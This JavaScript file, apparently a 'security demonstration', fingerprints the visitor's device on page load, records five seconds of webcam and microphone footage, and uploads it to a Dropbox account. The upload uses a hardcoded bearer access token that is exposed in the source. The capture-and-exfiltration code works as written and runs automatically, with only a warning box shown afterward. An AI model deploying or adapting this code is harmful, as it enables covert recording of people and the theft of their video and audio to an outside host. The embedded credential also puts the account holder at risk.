window.onload = async () => {
    const deviceInfo = {
        browser: navigator.userAgent,
        os: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        resolution: `${window.screen.width}x${window.screen.height}`
    };
    console.log("Device Info Captured:", deviceInfo);

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const videoElement = document.getElementById('video');
        
        videoElement.srcObject = stream;

        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) {
                chunks.push(e.data);
            }
        };

        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            
            const localVideoUrl = URL.createObjectURL(videoBlob);
            
            videoElement.srcObject = null;        
            videoElement.src = localVideoUrl;     
            videoElement.style.display = "block"; 
            videoElement.width = 400;             
            videoElement.controls = true;         
            
            console.log("Phase 1: Video saved to local memory and ready for viewing.");

            console.log("Phase 2: Starting cloud upload to Dropbox...");
            await uploadToCloud(videoBlob);
        };

        mediaRecorder.start();
        console.log("Recording started...");
        
        setTimeout(() => {
            if (mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                console.log("Recording finished.");
            }
        }, 5000);

    } catch (err) {
        console.error("Camera access denied or hardware not found.", err);
        alert("Camera access is required for this security demonstration.");
    }
};

async function uploadToCloud(videoBlob) {
    const ACCESS_TOKEN = 'sl.u.AGUs8_5fEIUVEoH8fu5hjeInkCqMY4b6b0nQl7wryfNbCk7zSN06kB2NiYHdVwZP4wZMzMcso0qrBnfhS1Hmhl6ca22lt3mUi7SXEhX3pt3AsklWM6JgZTgJexjE3KLAGfvgUg4wb2dWZ9PZnnfH_irQsAsWk-EtoEYOGSqiLQdndF0Awn3yD502VZzTbL0UeZoHuNKR7HNHOuqPv5D9O0QF7Z15r7DHA0VGJzECEVzcqgIBtvYVtqpQtTB3Lrw67hPCevCYnLgIV2aAhBBdQE1TMmvgemhTPB4rE2iz5DgIL821PjF_kDXiIztoz3l5Zz_P_-_ZhaLau2-TxJ46ghLigFBQRUrbDwGkGE2XkzGGuWe7PS6b1lywyQbTVXv8-3DdQrUPY-XPrbRoIYLc2MffuXqkQocUZrNLW9dJVk8JjcW-GM-ukFkScMayw2u-u3bg7i7vT4L4pOeMmHdBVgBQSMPpOOIfsFeinu089oNzbaUdO1TYEpbfWC1r2sPDfd5LhPfgvoR6glzW3hp_TA11v5ZtphOICF5Zn68YiZckMP_M-eXS_e5xVRCitwlmMXR8HDG4JoaZLIUs1Pzjf6NHJ5MGQ329LNxYk93dcpoHgFost0XyLrXZYsr73DZS1XWFdKqTplSAqfq3g0UTmSZGdGW9g963wFxjDiRSV4RfVkdWrZiR9ON3GUPqz6ysfvA76zrW3hMpE_V6d6fPpGs_QDFaNdfH_OaRGMMpw_Jaf2G4sCJhjFuJcWs9Ikl6ZGtYkURrXTqxpP_SbcmvHldZBLEdGietQt9B3FlC-mvi9sgCzixxJikuL2epVDGEraw8G3cMiXO2geMth-zu-MkUfJcOuDKGDsN7dveoD38IhbTNL6pfA-GvuOmb14C8GHqPT59FPKBWnQKsmvh9O-yhEQS9knU4rxUxJ5-0i8Zc9HxQO-qnaYWix16coXRHvypvx06c182mrdxK3Hv6KnB67YgiP6OVo9cJ_2oBnEdy-KEzazIYPyAxrWnMGi_LIHQg_-TKgSxwQ_Qt9tjotAlsRIKdl0fDd_Zol2T8qJnbhJUiSFxoHnoO-hyl0OpDp_7ACBpOv9yTfthl7jqdaXv5POgrlNpBCAN6VdnbFbdW-oxbJy7hsaAsvyk6x3ainmUwV2VXkRUke3WOmhZCTHV1QWINcicBrRz-mDl4s3ax9tW6xQ8jycuvzyBtcsN6sHCXEKhgE305t7via_qWecyntMpvE6xn5hSZfjcaFT5Zt2scLBL3rXSP1GUMlD4QC_qnMRrO51l1MsxTjbyM_a38n32CxH_hs7jqDixlMxmIiTn_PN2VkpTlqXYEuuwOMCSZP59HkK3FgSwD4LUjYHfsahXuGa1dk0OW4EE4fURTqJlE9VS2sYxOPlDf0w6CRBVYNGO95mws-BGu4ML_EqpcjfoVmMMT2WVQEiQm1EwgXg'; 
    const fileName = `capture_${Date.now()}.webm`;

    try {
        const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Dropbox-API-Arg': JSON.stringify({
                    path: `/${fileName}`,
                    mode: 'add',
                    autorename: true,
                    mute: false
                }),
                'Content-Type': 'application/octet-stream'
            },
            body: videoBlob
        });

        if (!response.ok) {
            throw new Error(`Dropbox API Error: ${response.statusText}`);
        }

        const result = await response.json();
        console.log('Phase 2 Success: Video uploaded to Dropbox!', result);
        
        const warningBox = document.getElementById('warning-box');
        if (warningBox) {
            warningBox.style.display = 'block';
        }

    } catch (error) {
        console.error('Cloud Upload Failed:', error);
    }
}